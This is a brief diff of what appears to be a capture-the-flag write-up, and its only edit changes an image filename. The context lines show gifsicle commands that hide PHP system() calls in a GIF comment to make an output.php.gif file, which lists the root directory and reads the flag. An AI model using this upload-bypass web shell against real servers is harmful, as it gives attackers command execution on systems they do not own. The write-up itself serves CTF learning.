@@ -83,7 +83,7 @@ gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
 gifsicle < frame-1.gif --comment "<?php system('cd / && cat flag'); ?>" > output.php.gif
 ```
 
-![](<../.gitbook/assets/image (2) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (2).png>)
 
 flag in some confusing thing like this:
 
